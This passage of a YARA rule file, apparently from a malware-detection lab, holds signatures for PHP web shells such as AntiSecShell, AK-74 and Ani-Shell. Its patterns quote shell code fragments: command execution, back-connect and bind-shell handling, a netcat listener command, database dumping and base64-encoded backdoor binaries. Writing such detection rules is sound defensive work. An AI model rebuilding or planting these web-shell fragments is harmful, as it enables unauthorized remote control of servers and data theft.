      $s11 = "if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi(\"^[0-7]{4}$\",$_GET['md'])) $MSG_BOX = '" fullword ascii
      $s12 = "\\',\\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\\');return false;\"> " fullword ascii
      $s13 = "if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '" fullword ascii
      $s14 = "</a> <a href=\"?s=e&df='.urlencode($Filepath).'\" target=\"_blank\"> " fullword ascii
      $s15 = "echo '<tr><td><a href=\"?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'\"> " fullword ascii
      $s16 = "if($object == 'downloader')" fullword ascii
      $s17 = "$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'" fullword ascii
      $s18 = "if(isset($_POST['stphp'])){$features_all = $features_php; $st = '\\.php|\\.inc|\\;';}" fullword ascii
      $s19 = "if($_POST['inout'] == 'a') $_POST['gl'] = str_replace('.','\\\\.',$_POST['gl']); else $_POST['gl'] = '';" fullword ascii
      $s20 = "echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '<a href=\"#\" onclick=\"history.back();\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _020bf2c45e7bb322f89a226bd2c5d41b_45d3e57928a8114edf63e43b461d9ca637eeeb98_81
{
   meta:
      description = "php17 - from files 020bf2c45e7bb322f89a226bd2c5d41b.php, 45d3e57928a8114edf63e43b461d9ca637eeeb98.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "679d5bff03cb626f7c3c3e108ea84cc83dfa79333c26155fb08d2de7d9f00840"
      hash2 = "8d1bf29ddbfb9583ba4eb4a0a0ce1e1fbe7cd7ef2bea86462cfa3532eef9ce57"
   strings:
      $s1 = "<?php  $auth_pass=\"\";$color=\"#df5\";$default_action=\"FilesMan\";$default_use_ajax=true;$default_charset=\"Windows-1251\";pre" ascii
      $s2 = "9KIlX5X5BysvX/dyp+nh8fYuaZCLPPaHNJugyiqGWcLzLx6eyRwif6fV8O6c7G2f7fHZhMJLnfx2GMpipebO8YcvlMiXhfwqm2IiUTmaQliiSf5tQfLsJDdeLbgtrZEY" ascii
      $s3 = "lNMqYbT3/tiHkbWdMsyjaeDCmfTImZlYPWrSkto4ST9GcMAPz7qe6CLOhlyrR+2i/IPxRDaMUWuo0yyQioDLlXI4VnmkO/i/ZlwmEKMyDxIAYUBypxtm1e9yWeH+ySRw" ascii
      $s4 = "3nLPQ82z56J+8JblyYLLBLFxCEowXhBLrWXJ3lLaND3ftjz6asy3vEgKYA9fGktRoeqy55EhL+s2TVR2P0CCBH4EDaRrXEwC3zzzg9PlwKmVY91G/GyKMZ8MUvbE88jI" ascii
      $s5 = "FxePq53MEElCBaFUcMY5g2CgAQ4koKAWMV+YOMioLxD18ET4h9IkSYhbAeU18cQBB72nm9IOdjXt1HgpPbGiIfwmRoFO5xevWdYdt+jqrkjwqB6Bbb2A+zoruBuF8Spy" ascii
      $s6 = "xPuZZyuXimnFRR1kAdXMm3b7tP3cd5RkmdhCqhScYDDbhqJ2UJdlLbxhrlxn5JzWr0nqNjBGobFAwHtAqllrL2tNZ1Tweu17zemMrDkdBhnRbQ9NosSUQaJ0IzlTt0qE" ascii
      $s7 = "bo0jCcZJXJ057mAIlHZJdMLMYe0OvgL4WvWcftR4PoHzgO+B6CpGcmL1enAgarA65EBuk7e19gwaK1uZT6FsO5SBinrudUUM8R2LkSJCDhdXn4NtfX0dUUA7kTdWe3Be" ascii
      $s8 = "liaAXjBzupgO+8oI/wZXwykarWPS8Crw/ejKhaXFdCckRIX0sz9DQgN3MnMDomToOl6P2kkey9CLAbYlHNO6BMwP+y+S7vZCqzfCwjbOnwHC3Lg9atUAdgf7iv+cYegU" ascii
      $s9 = "erITh/tLvQsBHGol75kaU/LwwYP4ZDjp0FcRY6Xhl3hvUOaKT8rGB4XV7E+nxx2YoqcHx0eQG1p9ZwTMSllb7thFV5WiicmdET3qyuIYbU4Agjc9lmCpzzk5MCOz70Hc" ascii
      $s10 = "Vri4Mr7JqlWmrcHju7XNTJIQpQVNXFyner+f+ciE9lHM1w0Y01lQbou0u4AoSspQMozgSgDyI0iriwxdb2NwZwah/VIMODKW9d/KzNTLmqWWvHnTvF1SmqHCBHI1pr9/" ascii
      $s11 = "ib/if0oGDtoVjpjVZt821qIhjVkvACEPeQknApoPxL3gh9gixcRCtiAgSce0oU//ggxsDWEpcauODllwUErFbFxe4iIoq6FmziM/npZIMRArUawR9RcsSUL6oRUmLYSo" ascii
      $s12 = "yDxVQiXDTJnc5Vhtxqehi3pzWhDlrREXBcwZZnFV5ERX5tNtUTw+9BlXxEULtRZ+LSnuKUhZoRjfNqWOeViTWp8QjgfAB7cMFQfBiEwLQNirca0IFzKF+SQOizYojv0B" ascii
      $s13 = "FE9x9c2O+ewgOzclMOmM0X8MUwgTWKtHGn25hYvel086UBjagzFIdGnRa7FeQYlnf58vYSXcQq5dLq2//AwRG5LksIvJeSQVETLvUU7AEF8NVZKIjfepub14Fj862sqR" ascii
      $s14 = "of/RdWan7l8gUCRSltol+0C8hlIrE8uEvEjRhN7CRYEpWWsK5l9qVc4kP8Vjoe5RKMtQDR+cYBTuYO/lKdDmdpo+OxF5XFjaVZH6Xlt15NJzwRCG92lMnFwTcFYo00FO" ascii
      $s15 = "Le7l2BlJHTCexobFhoHTb5k/mswf27AFXLXMASym+6h8eW+NYfW8NAyB8g9C+cdGq+DiX8So4yMCLgp/fKvQbW+qskujZLaNigACWcBY21iz2gZvO5/yyfWfeX62v/oS" ascii
      $s16 = "v1/pVex+xR4J8RqtWGjrkJYwWy7abGRNgdHASzzKqdqwwL5TYEZF7QUKyFYRj1GovZOyZ+ENVpxIjZXKL3bvMnxavPif5renpcKKUdZnrPQf5Tpu4bssvUe5xjPl1cOf" ascii
      $s17 = "BVafIGkGhQKjP08ptqK0VigEc4mhGuuZFsbJ84nxBDFPnxbcEpKiuCVW65/Nsh/0BE2l2BKQ5OTpZIJycjC/i/qwtXTibUUnTc97DH3mT2ZFjNNytBXChOuSx5TMV1bo" ascii
      $s18 = "V/6W6Mh3GVxGl5fmZdUQDlDELtTHMmwNcQU/HwoeScJ7ZfxKRb/i7FjRc6hTSt/R21XOJsmBOhvLSU5ILYUkXHlAuFOO4Xicw/R5Z27hIFqZsDthXA6LTfNeepmZ+sgL" ascii
      $s19 = "fjo1/F/znkDLUa8cDe9AFBlHDfbrJGKHU9vtWeWPTtCzxlZzZAVw/m5Um9cOnHpty1sldUoj8icphOz+CYk1MOv7/h0Tmf1+v5klp16vI3w4scblYa1sSXDR+2zFHaFg" ascii
      $s20 = "iYXfSQfYHbysTTtpGWZT3UB5N/l0ly9uKqgU9pKAzcLBpPY978yfkHdoOv0N7ZpNpa/TYbT+LzfsSZxwMeYkfyF97xrdDJn4sq0JLDwOJYZF+lN5t/dl9/jTUan5BN/f" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _398fcc4176cbdefb9271ad67decbab5c08312bf2_AntiSecShell_v0_5_82
{
   meta:
      description = "php17 - from files 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, AntiSecShell.v0.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash2 = "da5ea23323881addae2ecd9a44947f05d5dbc216ac24cdf9361b14f18ea8e31c"
   strings:
      $x1 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> - <input type=submit name=submit value=\"Execute\">" fullword ascii
      $x2 = "$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;" fullword ascii
      $x3 = "$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;" fullword ascii
      $s4 = "echo \"<div class=barheader>.: Result of Command Execution :.</div>\";" fullword ascii
      $s5 = "<td><form method=\"post\" action=\"http://google.com/search\">" fullword ascii
      $s6 = "<input type=\"file\" name=\"uploadfile\"> - <input type=submit name=submit value=\"Upload\"> <?php echo $wdt; ?>" fullword ascii
      $s7 = "echo \"<b>Command Execution</b>\";" fullword ascii
      $s8 = "<input type=\"text\" name=\"f\" size=\"70\" value=\"<?php echo $dispd; ?>\"> - <input type=submit value=\"View\">" fullword ascii
      $s9 = "header(\"WWW-Authenticate: Basic realm=\\\"\".$sh_name.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s10 = "if (($_SERVER[\"PHP_AUTH_USER\"] != $login) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $md5_pass)) {" fullword ascii
      $s11 = "<input type=submit name=submit value=\"Execute\"><hr noshade size=1>" fullword ascii
      $s12 = "n port for it first. Once open, use NetCat, and run '<b>nc -l -n -v -p 5992</b>'<br><br></center>\");" fullword ascii
      $s13 = "if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']==\"Perl\")) {" fullword ascii
      $s14 = "($_SERVER[\"HTTP_HOST\"]).\"</a> - \"." fullword ascii
      $s15 = "if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']==\"C\")) {" fullword ascii
      $s16 = "echo \"<div class=barheader>.: Processes :.</div>\";" fullword ascii
      $s17 = "if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile).\"\\\"</b>: object already exists!\";}" fullword ascii
      $s18 = "echo \"<h4>Attention! SQL-Manager is <u>NOT</u> a ready module! Don't reports bugs.</h4>\"." fullword ascii
      $s19 = "\" cURL: \".testcurl().\" WGet: \".testwget().\" Fetch: \".testfetch().\" Perl: \".testperl().\"<br>\";" fullword ascii
      $s20 = "<input name=\"q\" type=\"text\" id=\"q\" size=\"80\" value=\"<?php echo wordwrap(php_uname()); ?>\"> -" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _04048aeca2c0f5d84639358008ed2ae7_07908a44d5a13497cbc0b1bebc2711af30699b5f_1b836517164c18caf2c92ee2a06c645e26936a0c_3c6b496a_83
{
   meta:
      description = "php17 - from files 04048aeca2c0f5d84639358008ed2ae7.php, 07908a44d5a13497cbc0b1bebc2711af30699b5f.php, 1b836517164c18caf2c92ee2a06c645e26936a0c.php, 3c6b496a8ef29509d3325690f2db9d5119653272.php, 52a24d47b2ef5b2e6b3fbc1256cd665b285cdfcb.php, 707c3581b213fb880e287d1f5338011c391c191b.php, 85892669184e1d2cbe29ceccc563adda.php, 992a2bc4b1e8a8ffd1f764fdd16b145167df1e98.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9b6d2f6aa7a0b96f945d64587d3d427764945cb9052f6eb70f935bc1e7546baf"
      hash2 = "7681d56cf9de3c807db7bd6a60b93b335bc7a0ba048dd32df6b4f81073c4c372"
      hash3 = "de4560335dc3fca28c6be33d682d36b9fbdf013b72c62e6836cceee9e96b0da1"
      hash4 = "ca6284d5af5bd5095225d45084fe9626a7ac078ad2f4cc4020d6f86e5daad0d1"
      hash5 = "e63f87c1811cfc8727bf6e2a3e8735110105c8b7dbe8475866d0edbca5ec2843"
      hash6 = "83b29f8bf786c061de47f592bdb7a78ce1f747b44cb5718700e2c9d65f3641b3"
      hash7 = "c4f21ed037126fc1f6e18feafc260c20c078f287b12e06cdfa6873271263fd33"
      hash8 = "5c764951c465e586adc1e53821ab20c0bcc3f542dcc720bbc6609dd75c33c528"
   strings:
      $x1 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $s2 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii
      $s3 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s4 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\".gz\\n\\n\");" fullword ascii
      $s5 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii
      $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii
      $s7 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\"\\n\\n\");" fullword ascii
      $s8 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii
      $s9 = "<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>" fullword ascii
      $s10 = "$dump_file.=($rows2[$k]==''?'null);':'\\''.addslashes($rows2[$k]).'\\');').\"\\n\";" fullword ascii
      $s11 = "$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s12 = "<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>" fullword ascii
      $s13 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii
      $s14 = "if(!@copy($_FILES[\"filename\"][\"tmp_name\"], $work_dir.$f)) echo('Upload is failed');" fullword ascii
      $s15 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii
      $s16 = "$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');" fullword ascii
      $s17 = "$temp_file=isset($_POST['temp_file'])?'on':'nn';" fullword ascii
      $s18 = "$dump_file.=$rows2[$k]==''?'null,':'\\''.addslashes($rows2[$k]).'\\',';" fullword ascii
      $s19 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}_${table_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n" ascii
      $s20 = "<tr><td><input type=submit name='action' value='dump'></td></tr>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _4abe7634820f3bf12d961cba7e2a3671ed3dfddf_AK_74_Security_Team_Web_Shell_Beta_Version_AK_74_Security_Team_Web_Shell_Beta_Vers_84
{
   meta:
      description = "php17 - from files 4abe7634820f3bf12d961cba7e2a3671ed3dfddf.php, AK-74 Security Team Web Shell Beta Version.php, AK-74-Security-Team-Web-Shell-Beta-Version.php, AK-74_Security_Team.php, AK_74_Security_Team_Web_Shell_Beta_Version.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7909ffe6a4479750b77b969bfe516841436aba67115d4b137b372619993f027"
      hash2 = "dc91561fd0b7a555e9e1a26fdd189d18832b9d896f50e7f8afa153773d1a851c"
      hash3 = "0c6879cdd19836091025915fb260a61558a39f379ae5d3cda4229d9cdb9a8689"
      hash4 = "240e94bf8a28e2104c6aded0c7ffffd0ed3d5f34af20defac6db69abf08b1b32"
      hash5 = "75087c6173f53d75216e20ae3e0b500c54f887ca9071528fa5e2a95bb4507d53"
   strings:
      $x1 = "<b><font color=#83000>Execute system commands!</font></b>" fullword ascii
      $s2 = "$content .= $shell->downloadfile($_GET['file']);" fullword ascii
      $s3 = "$content .= $shell->editfileform($_GET['file']);" fullword ascii
      $s4 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s5 = "$content .= $shell->chmodform($_GET['file']);" fullword ascii
      $s6 = "$content .= $shell->executeform();" fullword ascii
      $s7 = "$content .= $shell->outputhead();" fullword ascii
      $s8 = "$shell->execute();" fullword ascii
      $s9 = "function execute()" fullword ascii
      $s10 = "<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Security Te" ascii
      $s11 = "fwrite($fp, stripslashes($_POST['filecontent']));" fullword ascii
      $s12 = ":</b></font> </td><td><input type=\"text\" name=\"dircreate\"><input type=\"submit\" value=\"" fullword ascii
      $s13 = "T-FAMILY: verdana; SCROLLBAR-DARKSHADOW-COLOR: #830000; BACKGROUND-COLOR: #dcdcdc; " fullword ascii
      $s14 = "$content .= $shell->outputfilemanager();" fullword ascii
      $s15 = "<b><font color=#830000 size=4>.:: :[ AK-74 Security Team Web-shell ]: ::.</font></b>" fullword ascii
      $s16 = "$res .= '<table border=0 width=\"700\" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style=\"border: #C10000 1px solid\">';" fullword ascii
      $s17 = "$timestart = $shell->getmicrotime();" fullword ascii
      $s18 = "$content .= $shell->removedir();" fullword ascii
      $s19 = "$content .= $shell->exesysform();" fullword ascii
      $s20 = "$content .= $shell->uploadfile();" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01386bd6d8e091c2ab4c7c7de644d37b_a574138c88289490300cee616b9357f807e582b6_aca4448bad781173bfe4bb370884310d9c12038a_Ani_Shel_85
{
   meta:
      description = "php17 - from files 01386bd6d8e091c2ab4c7c7de644d37b.php, a574138c88289490300cee616b9357f807e582b6.php, aca4448bad781173bfe4bb370884310d9c12038a.php, Ani-Shell.php, Ani-Shell__2_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05bfd5d205a17320acbc1ddac0af81ba0bf86c852ed3abc425242a42ae4f0582"
      hash2 = "9476a89065f61d65f093098e59444d605012872ade480bd02235cc545618231c"
      hash3 = "0efd4ff4f6438b8505371da6da8e52372efafdeae9ac78df73fbfd15939dace4"
      hash4 = "0a5f8c8a6f82be68b260ebcbd8d917e9209f548ea1ca5827e7d27d6653f8170a"
      hash5 = "c027a23d19d1eeb041c657ae53f8c14358fe84e1094aba16757c26ca835b5a00"
   strings:
      $x1 = "// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is" fullword ascii
      $s2 = "// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\\" fullword ascii
      $s3 = "$handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'" fullword ascii
      $s4 = "$output = shell_exec($command);" fullword ascii
      $s5 = "$handle = popen($command , \"r\"); // Open the command pipe for reading" fullword ascii
      $s6 = "$result=exec_all($_GET['cmd']);" fullword ascii
      $s7 = "//-------------------------------- Check what he wants -------------------------------------------" fullword ascii
      $s8 = "//---------------------------------- Fuctions ---------------------------------------------------" fullword ascii
      $s9 = "function exec_all($command)" fullword ascii
      $s10 = "// The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported " fullword ascii
      $s11 = "// ----------------------------------------------------------------------------------------------------------------" fullword ascii
      $s12 = "$subject = \"Shell Accessed -- Ani-Shell --\";" fullword ascii
      $s13 = "<!-- For Shell -->" fullword ascii
      $s14 = "exec($command,$output);" fullword ascii
      $s15 = "if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')" fullword ascii
      $s16 = "// --------------------- Tracebacks --------------------------------" fullword ascii
      $s17 = "$output .= fgets($pipes[1],512);" fullword ascii
      $s18 = "if(!isset($_GET['cmd']) || $_GET['cmd'] == '')" fullword ascii
      $s19 = "<!-- For CMD -->" fullword ascii
      $s20 = "//---------------------------------- We are authenticated now-------------------------------------" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_15febc7c452fb361fc5eca8e67711a86a9ee0b9e_1898eebe767f4dda4709621164eeef8377c43bb3_36c1b4ea_86
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, acid.php, acidshell.php, ad1928ed1cec75b09a7d05548b47cae5c472a427.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash3 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash4 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash5 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash6 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash7 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash8 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
      hash9 = "63d02e75b729e2cc17604235cf9c0b506b3ca5d578a8e32a0e85e28763ca25a6"
   strings:
      $x1 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $s2 = "UT1JfRU5EX18AX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2RvX2dsb2JhbF9jdG9yc19hdXgAYmFjay5jAGV4ZWNsQEBHTElCQ18yLjAAX0RZTkFNSUMAY2xvc2V" ascii
      $s3 = "uZmluaQAucm9kYXRhAC5laF9mcmFtZQAuY3RvcnMALmR0b3JzAC5qY3IALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAA" ascii
      $s4 = "jYXRAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AF9maW5pAF9fcHJlaW5pdF9hcnJheV9lbmQAYnplcm9AQEdMSUJDXzIuMABleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkN" ascii
      $s5 = "kckBAR0xJQkNfMi4wAF9fYnNzX3N0YXJ0AG1haW4AX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2luaXRfYXJyYXlfZW5kAGR1cDJAQEdMSUJDXzIuMABzdHJ" ascii
      $s6 = "PX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19wcmVpbml0X2FycmF5X3N0YXJ0AF9fZ21vbl9zdGF" ascii
      $s7 = "fXwBfX0RUT1JfTElTVF9fAF9fSkNSX0xJU1RfXwBwLjAAY29tcGxldGVkLjEAX19kb19nbG9iYWxfZHRvcnNfYXV4AGZyYW1lX2R1bW15AF9fQ1RPUl9FTkRfXwBfX0R" ascii
      $s8 = "vbm5lY3QAZXhlY2wAcGVycm9yAGR1cDIAc3lzdGVtAHNvY2tldABiemVybwBzdHJjYXQAaW5ldF9hZGRyAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABkYWV" ascii
      $s9 = "fMi4wAF9pbml0AGRhZW1vbkBAR0xJQkNfMi4wAF9zdGFydABzdHJsZW5AQEdMSUJDXzIuMABfX2ZpbmlfYXJyYXlfc3RhcnQAX19saWJjX2NzdV9pbml0AGluZXRfYWR" ascii
      $s10 = "fMi4wAF9lZGF0YQBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX2VuZABodG9uc0BAR0xJQkNfMi4wAGNvbm5lY3RAQEdMSUJDXzIuMABfX2luaXRfYXJyYXlfc3RhcnQAX0l" ascii
      $s11 = "uNSAyMDA1MTIwMSAoUmVkIEhhdCAzLjQuNS0yKQAAR0NDOiAoR05VKSAzLjQuNSAyMDA1MTIwMSAoUmVkIEhhdCAzLjQuNS0yKQAAR0NDOiAoR05VKSAzLjQuNSAyMDA" ascii
      $s12 = "oUmVkIEhhdCAzLjQuNS0yKQAAR0NDOiAoR05VKSAzLjQuNSAyMDA1MTIwMSAoUmVkIEhhdCAzLjQuNS0yKQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAuaW50ZXJ" ascii
      $s13 = "wAC5ub3RlLkFCSS10YWcALmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsLmR5bgAucmVsLnBsdAAuaW5pdAAudGV4dAA" ascii
      $s14 = "AQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAX19maW5pX2FycmF5X2VuZABfX2Rzb19oYW5kbGUAX19saWJjX2NzdV9maW5pAHN5c3RlbUBAR0xJQkN" ascii
      $s15 = "1MTIwMSAoUmVkIEhhdCAzLjQuNS0yKQAAR0NDOiAoR05VKSAzLjQuNSAyMDA1MTIwMSAoUmVkIEhhdCAzLjQuNS0yKQAAR0NDOiAoR05VKSAzLjQuNSAyMDA1MTIwMSA" ascii
      $s16 = "XN0ZW00PSAnL2Jpbi9zaCc7DQokMD0kY21kOw0KJHRhcmdldD0kQVJHVlswXTsNCiRwb3J0PSRBUkdWWzFdOw0KJGlhZGRyPWluZXRfYXRvbigkdGFyZ2V0KSB8fCBka" ascii
      $s17 = "2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18A\";" fullword ascii
      $s18 = "ElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword ascii
      $s19 = "2hlbGwgKFByaXZhdGUgQnVpbGQgdjAuMykgYmluZCBzaGVsbCBiYWNrZG9vciA6OiAKCgBzb2NrZXQAYmluZABsaXN0ZW4AL2Jpbi9zaAAAAAAAAP////8AAAAA/////" ascii
      $s20 = "IPABIsAiQQk6Jv+//8Pt8CJBCTosP7//2aJRdbHRCQQBAAAAI1F5IlEJAzHRCQIAgAAAMdEJAQBAAAAi0XwiQQk6BL+//+NRdTHRCQIEAAAAIlEJASLRfCJBCToKP7//" ascii
   condition:
      ( ( uint16(0) == 0x733c or uint16(0) == 0x3f3c ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _05a5cf06982ba7892ed2a6d38fe832d6_351df1bd824721442e4e709e3806a9fc139de3e6_a14f987baeff8875419578f234d3f7bd176ecae9_a3a45774_87
{
   meta:
      description = "php17 - from files 05a5cf06982ba7892ed2a6d38fe832d6.php, 351df1bd824721442e4e709e3806a9fc139de3e6.php, a14f987baeff8875419578f234d3f7bd176ecae9.php, a3a45774024ad0f93c71041f4baf72ad6ca34522.php, a3b57f52c3782c20a2c006533c8f5d815034aefc.php, ae47d0c555af72c76439a56cf4a97da86eb97412.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9a872a2424ca1193c32e55b9bac11c09ba29d15182ad89734492c5193fd64d55"
      hash2 = "c9e0c70dddb705dddf0a5f54c517a380f8f914b6d0b4149ac8524c5df586a274"
      hash3 = "a7b068946ecd1e014c436f359287852193d56e75803f2cb949be6d13186bbb38"
      hash4 = "6d8435d732262dd06b1022983eb90db9bba800e4f25984e616ee143d26561621"
      hash5 = "c53b0ccd965a4c11601fccd308ef7ba02c784e7984984682313cca6acf67f6d4"
      hash6 = "faefad57447fce349f5bf2b7f253ed96883313d875d7f418b8730f8dc8f38e3f"
   strings:
      $s1 = "if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {" fullword ascii
      $s2 = "if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {" fullword ascii
      $s3 = "if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {" fullword ascii
      $s4 = "if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {" fullword ascii
      $s5 = "if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {" fullword ascii
      $s6 = "if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {" fullword ascii
      $s7 = "if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {" fullword ascii
      $s8 = "if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {" fullword ascii
      $s9 = "if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {" fullword ascii
      $s10 = "if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {" fullword ascii
      $s11 = "if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {" fullword ascii
      $s12 = "if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {" fullword ascii
      $s13 = "if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {" fullword ascii
      $s14 = "if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {" fullword ascii
      $s15 = "if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {" fullword ascii
      $s16 = "if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {" fullword ascii
      $s17 = "if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {" fullword ascii
      $s18 = "if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {" fullword ascii
      $s19 = "if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {" fullword ascii
      $s20 = "if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x4947 ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

